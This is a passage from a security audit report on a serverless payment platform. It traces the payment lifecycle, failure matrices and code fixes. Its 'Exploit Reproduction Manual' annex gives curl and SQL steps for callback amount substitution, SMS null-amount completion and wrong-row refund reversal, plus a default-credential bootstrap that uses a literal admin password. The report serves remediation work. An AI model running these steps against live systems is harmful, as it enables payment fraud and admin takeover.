T0  customer pays; SMS lands; sms-consumer starts completeTransaction
T0+ε cron (*/5): UPDATE intents SET status='expired' WHERE status IN ('pending','processing') AND expires_at<now
T1  completeTransaction: postPaymentLedgerEntry → POSTED (ledger committed)
T2  completeTransaction: UPDATE intents SET status='completed' … WHERE id=?     [no guard → completed]
T3  customer status poll: completed. Ledger posted. Intent updated_at later.   [converged, by luck of order]
    (reverse order: expiry at T2′ after posting → intent 'expired' + ledger posted + tx 'expired'
     → money taken, payment shows expired, webhook never sent, nothing heals it)
```

## A15.3 The webhook + SMS double-completion (converges — the good case)

```
gateway webhook (stripe) and sms-consumer both target intent 42:
webhook:  event dedup ok → completeTransaction(42): ledger post m1:payment:42 → POSTED
sms:      corroboration ok → completeTransaction(42): ledger post → 'duplicate' (no double post)
both:     UPDATE intents 'completed' (idempotent) · dispatcher.enqueue ×2 → merchant gets TWO
          payment.completed webhooks (no delivery id to dedup)                    [P1-004 consequence]
```

## A15.4 Refund workflow wrong-row reversal (EDGE-P0-002, numeric walk)

```
Facts: payment P (op_transactions.id=57, intent 55) posted ledger row L_P with
       op_ledger_transactions.id=61, uuid='m9:payment:55'.
       An unrelated earlier posting for another intent has op_ledger_transactions.id=57 (!),
       uuid='m9:payment:12', status='posted'.
Refund R1 created on P (op_refunds.transaction_id=57).
Workflow finalize: ledger.reverse(57)
  → SELECT … FROM op_ledger_transactions WHERE id=57 AND status='posted'
  → returns the UNRELATED row (id 57, the one for intent 12)
  → posts reversal 'm9:reversal:<uuid of intent-12 row>' → inverts intent-12's entries
  → op_ledger_transactions.id=57 → 'reversed'
Result: refund R1 'completed'; intent 12's revenue reversed (wrong); intent 55's revenue
        untouched (books say refunded—customer repaid—yet P's posting stands).
Refund R2 on P: reverse(57) → row 57 now 'reversed' → throw '…not found or already reversed'
  → includes('already reversed') → swallowed → R2 'completed'. Provider refunded twice
  (nothing bounded it); ledger reversed (the wrong thing) once.
```

---

# Annex 16 — Test File Inventory (per-file detail)

| File | Tests | Focus | Boundary exercised? | Gaps vs this audit |
|---|---|---|---|---|
| ledger-do.test.ts | 14 | protocol A–F, dedup, balance, fault injection D/E/F, trial balance, input-gate discipline | **yes — the money boundary** | none material |
| ledger-consistency.test.ts | 11 | DO↔mirror consistency, replay idempotency, heal path | yes | mirror duplicate-line case (G-none → P2-008) |
| payment-integrity.test.ts | 7 | paired rows, idempotent completion, EXPLAIN index | yes (creation/completion) | callback binding/amount (G1); atomicity (G14) |
| payment-edgecases.test.ts | 4 | zero-amount, currency case, expires bounds | partial | amount ceiling (P2-018) |
| tenant-routing.test.ts | ~14 | API-key tenant mismatch; **JWT side broken** | partially | G20 (env secret); webhook master-domain (P2-004) |
| access-jwt.test.ts | 12 | alg pin, iss/aud/exp, kid, JWKS cache, break-glass deny, spoof email | **yes** | JWKS timeout (P2-011) |
| api-middleware.test.ts | 10 | CORS allow/deny, auth 401/403, rate-limit headers/binding paths | yes | scope matrix (G12) |
| jwt.test.ts | 10 | HS256 pin, aud, expiry, weak secret throw | yes | revocation (none exists) |
| money.test.ts | 8 | add/cmp/minor-units, 2^53, regex | yes | currency exponents (P2-019) |
| sms-parser-adversarial.test.ts | 9 | unicode digits, whitespace, mangled, partial | yes | ReDoS (G19) |
| sms-corroboration-edgecases.test.ts | 9 | ambiguity, case, amount mismatch, gateway conflict | yes (consumer gate) | checkout-side NULL hole (G2) |
| gateways-enabled.test.ts | 6 | parser: all/typo/alias/empty | yes | unset⇒all posture (P2-016) |
| gateway-integrity.test.ts | ~15 | md5 vectors, metadata pinning, refund-unsupported | yes | verify-amount echo (service-layer) |
| bd-gateways.test.ts | ~8 | bkash/sslcommerz/rocket/nagad flows | partial | substitution attack (G1) |
| catalog-port / port-kit / gateways.test.ts | ~20 | catalog integrity, form kit, registry | hygiene | — |
| runtime-integrity.test.ts | 4 | dead-config detection (csrf not mounted! AI binding) | **yes — caught P2-001 class** | none |
| smoke.test.ts | 4 | boot, 404 envelope, CORS preflight | basic | CSP on HTML (G6) |
| workflow-policy.test.ts | 6 | poll schedule, halt window | yes (policy fns) | workflow integration (G3) |
| api-reference.test.ts | ~5 | doc serving + CSP preset | yes | — |
| idempotency | 0 | — | **no** | G7 (race), cross-endpoint, 4xx-no-cache |

Notable: `runtime-integrity.test.ts` is the suite that *knows* the csrf middleware is unmounted and the AI binding is commented — the repo has self-awareness tooling that should be extended to the claims this audit falsified (body cap, event-id hash, sanitizeBrandColor, install 3/hour — a "documented-behavior pinning" suite would have caught all four regressions).

---

# Annex 17 — `wrangler.jsonc` Commentary (line-referenced)

| Lines | Setting | Auditor note |
|---|---|---|
| 25-26 | compatibility_date 2026-08-28 + nodejs_compat | matches pinned workerd; comment documents the bump policy — good practice |
| 47-67 | vars | ENABLED_GATEWAYS set to a 9-slug list in prod (unset⇒all — P2-016 applies to the *var* being deleted, not this file); JWT_TTL 3600; WEBHOOK_MAX_RETRIES 3 (duplicated in queue config — single-source this) |
| 76-83 | D1 | database_id real-looking; migrations_dir wired; deploy script ordering correct |
| 90-95 | KV | id present; free-tier write budget (1K/day) interacts with the KV rate limiter (120 install writes/min would exhaust it in ~8 minutes of sustained abuse — another reason the limiter config is wrong) |
| 98-105 | R2 | bucket bound, unwired (capability reserve — prior report's residual, still true) |
| 114-143 | Queues | producers+consumers with DLQs ✔; batch sizes 10/25/50; max_retries 3/5/3 — email 5 retries on a no-op consumer is harmless |
| 151-157 | Crons | 3 schedules (free-account limit 5 — the consolidation comment is accurate) |
| 162-168 | Observability | logs 100% + traces 1% — the cost residual from the prior report still applies |
| 173 | smart placement | the assets+placement warning noted in the prior report — informational |
| 181-188 | DO + migrations tag v1 | single class, tag matches — no DO migration hazard |
| 197-208 | Workflows | both classes bound ✔ (the P0-1 env-isolation fix held) |
| 215-226 | Ratelimits | namespaces 1001/1002, 120r/60s and 30w/60s — matches middleware expectations |
| 233-235 | Analytics (commented) | **P2-006** — the metrics story is inert |
| 243-248 | Assets | run_worker_first true + not_found_handling none — the anti-shadowing design (verified working: Worker sees every path; §9.1) |
| 250-254 | AI (commented) | parser falls back to heuristic-only — documented |
| 258-264 | Access note | dashboard-configured; the middleware's unconfigured fall-through is the complement (§9.5) |
| 266-276 | Native RL rules note | "recommended" dashboard rules — **not enforced by the repo**; the Worker-side coverage is the middleware's alone |

`wrangler.dev.jsonc` / `wrangler.staging.jsonc`: ENVIRONMENT/APP_URL distinct ✔; database_id/KV ids are placeholders (`0000…0001/0002`) — must be replaced before those envs deploy (prior report's own residual; still open). Both declare the full binding set (the P0-1 fix held across the jsonc conversion).

---

# Annex 18 — Severity Methodology Recap & Confidence Legend

**Severity assignment rules used (from the briefs, applied consistently):**
- **P0**: loss of funds, double spend, cross-tenant financial access, auth bypass, root compromise, secret compromise with material impact, ledger corruption, unauthorized payment completion. Every P0 in this report carries a credible exploit or deterministic failure scenario (the briefs' requirement — see each finding's scenario block).
- **P1**: significant unauthorized access, serious disclosure, reliable service compromise, payment-integrity degradation, reconciliation failure, persistent financial inconsistency.
- **P2**: limited weakness, availability issue, defense-in-depth gap, operational weakness.
- **P3**: hardening, maintainability, ergonomics, documentation.
- Severity was **not inflated**: e.g., EDGE-P0-006 is merchant-input-gated (could be argued P1) but was kept P0 because the checkout page is the platform's core payment surface and default deployments share one origin; EDGE-P2-002's seam is unreachable without worker-level compromise, hence P2 despite the scary shape.

**Confidence legend:** *Confirmed* = deterministic code trace or executed evidence. *Highly likely* = code trace + standard platform behavior. *Needs runtime validation* = requires live Workers behavior this environment could not execute. *Theoretical* = no finding in this report is theoretical-only.

---

# Annex 19 — Glossary

- **Posting protocol** — the A–F sequence inside `LedgerDO.postTransaction` (shape → dedup → balance → D1 pending → DO journal → D1 audit+posted).
- **tx_id** — the ledger idempotency key `m{merchant}:{kind}:{reference}`; also `op_ledger_transactions.uuid`.
- **Input gate** — Durable Objects' `blockConcurrencyWhile` serialization of all incoming calls to the object.
- **DO-ahead / D1-ahead** — crash-window states where one store committed and the other did not; healed by `reconcilePendingPostings`.
- **Shadow-copy logic** — a second, weaker implementation of a security gate (term used for the checkout SMS path vs `corroborateSmsPayment`).
- **Fail-closed / fail-open** — behavior on missing dependency: reject vs proceed.
- **Delivery id** — a stable outbound-webhook identifier letting receivers dedup redeliveries (absent — P1-004).
- **Outbox** — a transactional table ensuring side-effect dispatch survives crashes (absent — P2-007).
- **ID-space confusion** — passing a row id from table X where a semantically-different id from table Y is expected (EDGE-P0-002's root cause).


---

# Annex 20 — Complete Payment Lifecycle Walkthrough (happy path, every hop)

The briefs require the full call graph be reconstructed. This annex traces one complete payment from API creation to merchant notification, naming every function, table, and binding along the way, with the code path verified line-by-line during the audit.

**Phase 0 — request admission.**
`fetch()` (index.ts:242-244) → `app.fetch` → `requestId` (77) → `logger` (78) → bootstrap-check (83-108; KV `system:bootstrapped` hit ⇒ no-op) → `domainMiddleware` (109): Host = master domain ⇒ `merchantId=null`, no tenant context → `maintenanceMiddleware` (110): KV `system:maintenance` absent ⇒ pass → prettyJSON skipped (production) → `secureHeaders` builtin (125-128) → CORS evaluated for cross-origin only (136-149) → `securityHeadersMiddleware` (160): nonce CSP applied (JSON surface) → route match `/api/v1/payments` → `apiRoutes` stack.

**Phase 1 — authentication & throttling.**
`requireBearerApiAuth(['read','write','admin'])` (api.ts:24 → auth.ts:35-120): header parse → key regex (44) → prefix SELECT on `op_api_keys` JOIN `op_merchants` (53-60) → merchant-status check (74) → expiry check (78) → full-hash SELECT + `timingSafeEqual` (83-88) → scopes JSON parse + any-of check (92-96) → context vars set (100-102) → domain-merchant equality check (104-108: null ⇒ skip, master domain) → `last_used_at` fire-and-forget (112-117). Then `rateLimitMiddleware` (27 → rate-limit.ts:61-99): method GET/HEAD ⇒ RATE_LIMIT_READ else WRITE; `binding.limit({key:'key:'+apiKeyId})`; success ⇒ pass, failure ⇒ 429 + headers.

**Phase 2 — idempotency & validation.**
`idempotencyMiddleware` (api.ts:36 → idempotency.ts:42-179): POST ⇒ key header required? (optional here) → format `^[a-zA-Z0-9_-]{8,64}$` (67) → merchant known ⇒ body clone + sha256 (85-91) → SELECT `op_idempotency_keys (merchant,key)` (94-107) → none ⇒ proceed (the race window of P1-001 opens here). `zValidator('json', createPaymentSchema)` (37-41): amount regex `^\d+(\.\d{1,2})?$`, currency `^[A-Za-z]{3}$`, optional gateway/customer/metadata/expires bounds (validation.ts:29-45) — failure ⇒ 400 VALIDATION_ERROR with zod issues.

**Phase 3 — intent creation.**
`PaymentService.createIntent` (api.ts:48-59 → payment.ts:62-162): `isZero(amount)` guard (64) → token `randomToken(32)`=64-hex + `randomUuid()` (69-70) → `expires_at` = now + `expires_in_seconds ?? 900` (71-73) → gateway resolution: explicit `gateway_id` OR slug lookup on `op_gateways WHERE merchant_id=? AND slug=?` (77-85) OR first gateway (87-90) OR **auto-seed 'manual'** (95-104; P1-007) → INSERT `op_payment_intents` (pending, token, amount, currency upper, metadata JSON) (108-125) → intent id from `meta.last_row_id` or uuid SELECT (127-133) → INSERT `op_transactions` (`trx_id='op_'+24hex`, pending, net=amount, fee='0.00') (140-155). Response 201: `{intent_id, token, checkout_url:'/checkout/{token}'}`.

**Phase 4 — checkout.**
Customer opens `/checkout/{token}` (checkout.ts:16-74): intent SELECT by token (19-33) → gateways loaded (intent.gateway_id or all merchant actives, LEFT JOIN manual instructions) (41-57) → `renderCheckoutHTML` (301-752): escaped brand/amount/description; **raw brandColor into `<style>`** (321; P0-006); onclick args single-quoted (598; P0-006); inline JS with fetch to `/checkout/{token}/verify` and polling `/status`. Customer picks a gateway → POST `/checkout/{token}/initiate` (77-97): intent by token → `initiatePayment(intent.id, gateway_id)` (payment.ts:168-265): intent+trx SELECT (173-187) → gateway SELECT merchant-scoped (192-194) → `assertGatewayEnabled` for non-manual (198-199) → credentials SELECT + decrypt (203-216) → adapter branch: `adapter.initiate({amount, currency, trx_id, redirect_url, cancel_url}, credentials, {kv})` (240-250) → status batch: transactions/intents → 'processing' (253-262) → response `{redirect_url|form_html|action…}` → customer is redirected to the gateway.

**Phase 5 — confirmation (three convergent paths).**

*Path A — redirect callback.* Gateway redirects to `/checkout/{token}/callback?paymentID=…` (checkout.ts:257-273) → `handleCallback` (payment.ts:271-324): intent+tx+gateway SELECT (275-291) → credentials (298-310) → `adapter.verify(callbackData, credentials, {kv})` — provider-side execution/validation → `{success, gateway_trx_id, amount, status, trx_id}` → success ⇒ `completeTransaction` (and here P0-004: amount/trx_id discarded).

*Path B — inbound webhook.* `POST /webhook/{slug}` (webhooks.ts:57-218): registry+enabled check ⇒ 404 uniform (63-64) → merchant context (domain or platform-fallback; 69-84) → gateway row (91-98) → IP allowlist / geo (100-116) → credentials (118-128) → **rawBody** (131) → `adapter.verifyWebhook({rawBody, headers, credentials})` (136) — e.g. Stripe HMAC raw-body → invalid ⇒ 401 + delivery row (139-147) → JSON.parse (150-156) → event_id + dedup SELECT on `op_webhook_events` UNIQUE (158-171) → duplicate ⇒ 200 'duplicate' → INSERT event row incl. raw payload (174-189) → completion criteria `event_type` contains payment+succeeded/completed/captured (201) → `extractTransactionId` (203, 224-245: stripe metadata.edgepay_trx_id / paypal resource.custom / razorpay notes.trx_id) → tx SELECT `WHERE trx_id AND merchant_id` (205-208) → `completeTransaction(tx.id, tx.payment_intent_id, event_id)` (210-213).

*Path C — SMS.* Merchant phone receives carrier SMS → companion app POST `/api/mobile/v1/sms` (mobile.ts:171-189; JWT auth) → `SMS_QUEUE.send` → `smsQueueHandler.processOne` (sms-consumer.ts:38-122): INSERT `op_sms_data` (48-55) → parse: templates (regex from DB, merchant+shared) → heuristic → Workers-AI (58-61, parser 167-216) → UPDATE parsed fields (63-70) → parser==='none' ⇒ no_match + ack (72-80) → `loadOpenOrders` (pending/awaiting/processing/created, 30-min window, LIMIT 50; 125-161) → `senderToGatewaySlug` (sender short-code → gateway family) → `corroborateSmsPayment` (sms-corroboration.ts:101-169): parser/amount/trx mandatory → exact `cmp()==0` amount match → currency match → customer_trx_id equality → uniqueness → gateway-family check → 'confirm' ⇒ `completeTransaction` (sms-consumer.ts:87-98) + `match_status='matched'`; else manual review + metric.

**Phase 6 — completion (the money moment).**
`completeTransaction` (payment.ts:349-416): tx SELECT by db id (354-369) → **`postPaymentLedgerEntry`** (ledger.ts:345-387): accounts 1010/4000/5000 by (merchant, currency) (355-363) → entries [debit clearing amount, credit revenue amount] (+fee legs if fee≠0 — never populated today) → `LedgerService.post` (103-114) → `buildPayload` (299-337): account rows by (merchant, ids) → entries with `moneyToMinorStrict` → tx_id = `m{merchant}:payment:{intentId}` → `getLedgerDO(idFromName('merchant-{id}')).postTransaction(payload)` → **inside the DO input gate** (ledger-do.ts:113-137): A `validatePostingShape` (529-562: ≥2 entries, directions, positive safe ints ≤ 9e12, Σdebit=Σcredit) → B dedup SELECT `posted_transactions WHERE tx_id` (150-160; duplicate ⇒ return) → C `checkBalances` (401-439: per-account deltas, INSUFFICIENT_FUNDS before any write) → D `insertPendingPosting` D1 `ON CONFLICT DO NOTHING` + rejected-poison check (ledger-audit.ts:28-61; ledger-do.ts:169-181) → E journal INSERT + entries INSERT + balances UPDATE (195-223; commit on event completion) → F `writeLedgerAuditTrail` D1 batch: header ON CONFLICT(uuid) DO NOTHING + NOT-EXISTS-guarded entries + postings→'posted' (ledger-audit.ts:75-151) → return `{status:'posted', tx_id, ledger_transaction_id}` → back in completeTransaction: D1 batch `op_transactions SET status='completed', gateway_trx_id` + `op_payment_intents SET status='completed', completed_at` (389-399) → `WebhookDispatcher.dispatch` (401-415 → webhook-dispatcher.ts:34-68): webhooks SELECT for merchant, event subscription filter (46-51) → `WEBHOOK_QUEUE.sendBatch` per endpoint.

**Phase 7 — merchant notification.**
`webhookQueueHandler.processOne` (webhook-consumer.ts:26-88): `isAllowedWebhookUrl` SSRF check (36-40; the P1-004 gaps live here) → HMAC-SHA256 over the JSON payload with the merchant's `whsec_…` (42-43) → fetch POST with signature/timestamp headers, 15s AbortController (46-59) → 2xx ⇒ ack; 410/422 ⇒ ack; else ⇒ `msg.retry({delaySeconds})` (68-79; delay never escalates — P1-004) → after 3 attempts ⇒ `webhook-out-dlq` → delivery row INSERT `op_webhook_deliveries` each attempt (90-112).

**Phase 8 — housekeeping.**
Cron `*/5`: expire stale intents (cron/handler.ts:112-130). Cron hourly: `reconcilePendingPostings` (grace 30s; replay pending rows; deterministic-failure ⇒ rejected+page; duplicate ⇒ heal audit trail; 137-148). Cron daily: sweep workflow — replay(500) + `verifyAllMerchants` (DO-vs-mirror; pages drift; excludes platform merchant) + `sweepStuckRefunds` (24h re-drives ×3, then page) + run audit row. DO alarm daily: `snapshotBalances` → `op_ledger_balance_snapshots` (idempotent per day; 344-372).

That is the complete, verified happy path. Every deviation from it analyzed in this audit is annotated at the hop where it occurs.

---

# Annex 21 — Exploit Reproduction Manual (pre-fix)

Detailed, environment-building reproductions for the four money-relevant P0s. Each is written so a remediation engineer can (a) reproduce on the current tree, (b) verify the fix kills it. All run against `wrangler dev` (local) — never against any live deployment.

## A21.1 Callback substitution (EDGE-P0-004) — full setup

1. `npm run dev`; bootstrap completes (first request); retrieve the root key from the bootstrap logs/KV or use install wizard output.
2. Seed two intents via the API:
   ```
   curl -X POST :8787/api/v1/payments -H "Authorization: Bearer $KEY" \
     -d '{"amount":"100000.00","currency":"BDT","description":"BIG"}'   # intent B
   curl -X POST :8787/api/v1/payments -H "Authorization: Bearer $KEY" \
     -d '{"amount":"10.00","currency":"BDT","description":"SMALL"}'     # intent A
   ```
3. Complete intent A through the sandbox gateway (bKash sandbox paymentID or SSLCommerz sandbox val_id).
4. Navigate: `GET :8787/checkout/<tokenB>/callback?paymentID=<paymentID_of_A>`.
5. Observe: `GET :8787/checkout/<tokenB>/status` → `completed`; `op_ledger_postings` contains `m…:payment:<B>` with amount_minor = 10,000,000 (=100,000.00); `op_transactions B` status `completed`; webhook-out queue carries `payment.completed` amount 100000.00.
6. Post-fix expectation: step 4 returns 422 (ORDER_ID_MISMATCH or AMOUNT_MISMATCH); status remains `processing`; no posting row.

## A21.2 SMS NULL-amount completion (EDGE-P0-007)

1. Insert evidence row directly (simulating an unparseable-amount SMS):
   ```
   wrangler d1 execute DB --local --command "INSERT INTO op_sms_data
     (merchant_id, sender, body, match_status, parsed_amount, parsed_trx_id, parsed_at, created_at)
     VALUES (1, 'BKASH', 'Payment successful TrxID PENT1', 'no_match', NULL, 'PENT1',
             datetime('now'), datetime('now'))"
   ```
2. Create an intent for 99,999.00 (same merchant); open its checkout; submit `{"trx_id":"pent1"}` to `/checkout/<token>/verify`.
3. Observe: 200 `status:'completed'`; ledger posted 99,999.00; `op_sms_data.match_status='matched'`.
4. Post-fix expectation: 400 (amount not verifiable); nothing posted.

## A21.3 Refund wrong-row reversal (EDGE-P0-002)

1. Complete two unrelated payments P1 then P2 for the same merchant (ledger rows L1 id=n, L2 id=n+1, payments rows p1, p2 with ids that **differ** from n, n+1 by at least one offset — typical).
2. Refund P2 via admin: `POST /api/admin/v1/refunds {"transaction_id":<p2_id>,"amount":"<P2 amount>"} `.
3. Let the workflow run (dev: it polls; for manual gateways it fails fast — use a stub gateway or call `ledger.reverse(<p2_id>)` directly in a test).
4. Inspect: `SELECT id, uuid, status FROM op_ledger_transactions` — the row whose **id == p2_id** (an unrelated posting) flipped to `reversed` with a new reversal transaction; P2's own ledger row untouched; `op_refunds` row `completed`.
5. Variant (no numeric collision): refund a payment whose id exceeds max(ledger id) ⇒ `reverse()` throws not-found ⇒ swallowed ⇒ refund `completed`, **zero** reversal rows.
6. Post-fix expectation: reversal transaction references `m…:payment:<P2's intent>`; entries equal the refund amount; unrelated rows untouched; not-found is loud.

## A21.4 Default-credential chain (EDGE-P0-005)

1. Fresh state: delete `.wrangler` (or deploy-button fresh account); first request bootstraps.
2. `curl -X POST :8787/install/bootstrap-key -d '{"admin_email":"admin@edgepay.internal","admin_password":"AdminPass123456!"}'` → 200 + `api_key` (`['*']` scopes).
3. `curl :8787/api/admin/v1/merchants -H "Authorization: Bearer <minted key>"` → all merchants.
4. Post-fix expectation: step 2 → 401 (password is random and surfaced once at install); step 3 without a platform key → 403.

---

# Annex 22 — Full Posting-Protocol Failure Matrix (brief-mandated table, every row)

The briefs' Phase 6 requires the explicit step/storage/state/side-effect/failure-consequence/recovery table. Completed here for every boundary of the protocol plus the surrounding product steps:

| Step | Storage | State after step | Side effect | Failure consequence | Recovery |
|---|---|---|---|---|---|
| createIntent (1) | D1 | intent row (pending) | none | crash ⇒ orphan intent, no tx | none needed (client retries with idempotency… which is racey P1-001) |
| createIntent (2) | D1 | + tx row (pending) | none | crash between ⇒ intent w/o tx (P1-007) | none today — batch fix |
| initiate | D1 + gateway | processing; gateway session | provider session created | crash after initiate ⇒ processing intent with a live session; customer completes at gateway; callback arrives → completes normally (self-healing) | callback path |
| callback/webhook/SMS verify | provider + D1 | verification evidence | provider-side execute (bkash) | timeout after execute ⇒ tx 'failed' while money moved (stability finding) | none — needs unknown-state (A9) |
| completeTransaction step 1 → postPaymentLedgerEntry → DO step A-C | DO (in-memory) | nothing persisted | none | validation throw ⇒ structured failure ⇒ LedgerService throws ⇒ completion aborts | client/provider retry |
| DO step D | D1 | postings 'pending' | none | crash ⇒ pending row, no journal | hourly replay posts it |
| DO step E | DO storage | posted_transactions + journal + balances | ledger committed | crash before F ⇒ DO-ahead; replay hits dedup ⇒ heal | replay + `writeLedgerAuditTrail` heal |
| DO step F | D1 | audit trail + postings 'posted' | none | crash ⇒ D1-ahead of nothing (DO committed, mirror missing) | same heal |
| completeTransaction step 2 | D1 | tx+intent 'completed' | none | crash before ⇒ payment stuck non-completed while ledger posted (P1-006) | **none today — sweep heal needed** |
| completeTransaction step 3 | Queue | webhook-out messages | merchant notification enqueued | crash before send ⇒ notification lost forever (P2-007) | **none today — outbox needed** |
| webhook consumer fetch | network | delivery row | merchant's server receives signed POST | failure ⇒ retry ×3 (60s each) ⇒ DLQ | DLQ inspection |
| refund create | D1 + gateway | op_refunds 'pending' + provider refund | money returned at provider | crash after provider call, before insert ⇒ provider refunded, no record | none — reconcile with provider statement |
| refund workflow poll | gateway | — | status query ×≤52 | hang ⇒ step timeout + retries | workflow engine |
| refund finalize reversal | D1+DO | (intended) reversal posting | ledger compensating entry | **wrong row / none (P0-002)** | none — deterministic corruption |
| refund finalize webhook | queue | refund.completed sent | merchant notified | as payment webhook | DLQ |
| refund finalize status | D1 | op_refunds 'completed' | none | crash ⇒ refund stays pending ⇒ sweep re-drives | sweep (works) |
| expiry cron | D1 | 'expired' | none | race with completion (P1-006) | write-order dependent |
| reconciliation sweep | D1+DO | runs row; drift pages | none | failure ⇒ instance errored + page | next day's sweep |

Rows with "**none today**" are the four recovery gaps this audit adds to the roadmap (A3, A4, A9, P0-002).

---

# Annex 23 — Implementation-Ready Fix Specifications

Concrete enough to hand to a maintainer as tickets. (Pseudocode/diffs — not applied, per audit rules.)

## A23.1 Fix EDGE-P0-004 (callback binding) — `src/services/payment.ts`

```ts
// after: const verifyResult = await adapter.verify(callbackData, credentials, { kv: c.env.KV });
if (verifyResult.success) {
  const { cmp } = await import('../lib/money');
  if (verifyResult.amount != null && cmp(verifyResult.amount, intent.amount) !== 0) {
    await this.env.DB.prepare(
      `UPDATE op_transactions SET status = 'failed', updated_at = ? WHERE id = ? AND status NOT IN ('completed','expired','cancelled')`
    ).bind(new Date().toISOString(), intent.trx_db_id).run();
    throw new ValidationError(
      `Gateway amount ${verifyResult.amount} does not match order amount ${intent.amount}`);
  }
  if (verifyResult.trx_id && verifyResult.trx_id !== intent.trx_id) {
    throw new ValidationError('Gateway order reference does not match this payment');
  }
  await this.completeTransaction(intent.trx_db_id, intent.id, verifyResult.gateway_trx_id);
}
```
Mirror the same two checks in `webhooks.ts` completion (using the extracted trx id it already has) — the webhook path already binds by trx_id; only the amount leg is missing there.

## A23.2 Fix EDGE-P0-007 (SMS amount mandatory) — `src/controllers/checkout.ts`

```ts
// replace the truthiness guard:
if (!matchingSms.parsed_amount || cmp(matchingSms.parsed_amount, intent.amount) !== 0) {
  return c.json({ success: false, error: { code: 'AMOUNT_NOT_VERIFIED',
    message: 'Carrier confirmation amount missing or mismatched; payment cannot auto-complete' } }, 400);
}
// and restrict the query:
AND match_status IN ('parsed', 'needs_manual_review')
```

## A23.3 Fix EDGE-P0-002 (reversal keying) — `src/services/ledger.ts` + workflow

```ts
// ledger.ts — new resolver:
async reverseForPayment(env: Env, merchantId: number, paymentIntentId: number, amount: Money, reason: string) {
  const row = await env.DB.prepare(
    `SELECT id FROM op_ledger_transactions
     WHERE merchant_id = ? AND reference_type = 'payment' AND reference_id = ? AND status = 'posted' LIMIT 1`
  ).bind(merchantId, String(paymentIntentId)).first<{ id: number }>();
  if (!row) return { status: 'not_found' as const };
  // build FRESH balanced entries for `amount` (debit revenue, credit clearing),
  // idempotency key m{merchant}:refund:{paymentIntentId}:{refundRowId}
  …
}
// refund-reconciliation.ts — replace the reverse() call + string-match swallow:
const r = await ledger.reverseForPayment(env, refund.merchant_id, <intentId>, refund.amount, …);
if (r.status === 'not_found') throw new NonRetryableError('REFUND_LEDGER_MISSING');  // loud, never swallowed
```
(Requires `op_refunds` to carry `payment_intent_id` — join via `op_transactions` in the workflow's step 1 select, which already returns it if the column is added to the SELECT.)

## A23.4 Fix EDGE-P0-003 (refund bounds) — shared guard

```ts
const prior = await c.env.DB.prepare(
  `SELECT COALESCE(SUM(CAST(amount AS REAL)), 0) AS refunded FROM op_refunds
   WHERE transaction_id = ? AND merchant_id = ? AND status IN ('pending','completed')`
).bind(tx.id, merchantId).first<{ refunded: number }>();
const remaining = new MoneyDecimal(tx.amount).minus(prior?.refunded ?? 0);
if (new MoneyDecimal(refundAmount).gt(remaining)) return 422 REFUND_EXCEEDS_CAPTURE;
```
Apply in both the API route (after delegating to RefundService) and RefundService.createRefund; back it with migration D4's trigger for defense-in-depth.

## A23.5 Fix EDGE-P0-006 (checkout escaping) — `src/controllers/checkout.ts`

```ts
function sanitizeBrandColor(v: string | null | undefined): string {
  return v && /^#[0-9a-fA-F]{6}$/.test(v.trim()) ? v.trim() : '#0052cc';
}
// template: replace onclick string args with data attributes:
`<label class="gateway-option" data-gw-id="${gw.id}" data-gw-account="${escapeHtml(gw.account_number ?? '')}"
        data-gw-instructions="${escapeHtml(gw.instructions ?? '')}" data-gw-type="${escapeHtml(gw.type)}">`
// one delegated listener:
document.querySelectorAll('.gateway-option').forEach(el =>
  el.addEventListener('click', () => selectGateway(
    el, Number(el.dataset.gwId), el.dataset.gwAccount ?? '', el.dataset.gwInstructions ?? '', el.dataset.gwType ?? '')));
```
Plus: mount `securityHeadersMiddleware` on `/checkout/*`, `/invoice/*`, `/pay/*`, and thread `cspNonce` into the template's two inline `<script>` blocks (`<script nonce="${nonce}">`). The polling interval script needs no external origins; `connect-src 'self'` already covers its fetches.

## A23.6 Fix EDGE-P0-005 (bootstrap posture) — summary of the four edits

1. bootstrap.ts: `const adminPassword = randomToken(16)` + return-once contract via the install wizard; delete `KV.put('system:root_api_key')` and the `'123456'`/`AdminPass123456!` literals.
2. install.ts bootstrap-key: `if (await c.env.KV.get('system:installed') !== 'true') 404` + failed-attempt KV counter (`authfail:{email}` TTL 1h, 5 strikes ⇒ 429) + `page('BOOTSTRAP_KEY_USED', {ip})` on success.
3. rate-limit.ts: `'install': { windowSec: 3600, maxRequests: 3 }`.
4. Startup self-check (index.ts bootstrap middleware, after ensure): if any `op_merchant_users` row verifies against `AdminPass123456!` ⇒ `page('DEFAULT_CREDENTIAL_ACTIVE')` and refuse `/api/admin/*` (Access middleware checks a KV flag set here).

---

# Annex 24 — Re-Audit Checklist (for the next auditor)

1. Re-run §2.1 baseline (expect: 0 failed suites after G20; lint green after config lands).
2. Re-run Annex 7 battery end-to-end — all 8 groups must PASS.
3. Verify the §22 pattern has not recurred: grep for the six magic strings (`MAX_WEBHOOK_BYTES`, `hash:${`, `sanitizeBrandColor`, `__installLimited`, `Idempotency-Key`, `GatewayNotConfiguredError`) — each must now exist in code, not just comments; add the "documented-behavior pinning" suite (Annex 16's recommendation) so absence fails CI.
4. Re-check §8.6 matrix with fault injection at the new boundaries (outbox send, sweep heal).
5. Re-verify EDGE-P0-002's three cases with the Annex 21.3 procedure.
6. Confirm secrets: `rg "op_live_" scripts/ src/ tests/` empty; KV `system:root_api_key` absent; JWT_SECRET rotated (old tokens rejected).
7. Re-run the twenty questions (§21) — targets: Q4/Q9/Q19 flip to NO/PASS; Q20 flips to YES.
8. Re-run §17 matrix — rows 2,3,4,9,11,12,13,17,18,19,20 change state.

---

# Annex 25 — Final Deliverable Cross-Reference (briefs' §42 checklist)

| Required output | Where in this report |
|---|---|
| A. Executive summary (risk rating, counts, can-it-process-money, top risks, top improvements) | §3 |
| B. Architecture assessment (9 scored dimensions) | §4 |
| C. Security assessment (13 scored controls) | §14 |
| D. Stability assessment (10 scored dimensions) | §15 |
| E. Data integrity assessment (7 explicit questions) | §16 |
| F. Attack / failure matrix (17+ scenarios, expected/actual/severity/recoverable) | §17 (+ Annex 22 full protocol matrix) |
| G. Remediation roadmap (DO NOW / NEXT / HARDEN / OPTIONAL, with file/change/why/risk/test/migration) | §29 (+ Annex 11 effort, Annex 23 specs) |
| Architecture map (request + async + trust boundaries) | §5 (+ Annex 20 full lifecycle) |
| Payment state machine table + impossible transitions | §7 |
| Ledger invariants A–E with evidence/tests/verdicts | §8 |
| P0 file deep reviews (the seven files, full template) | §9 |
| Findings in the mandated format (ID/severity/confidence/category/files/scenario/guard/why/impact/exploitability/reproduction/fix/test/verdict) | §10–§13 |
| Posting-protocol failure matrix (step/storage/state/effect/consequence/recovery) | §8.6 + Annex 22 |
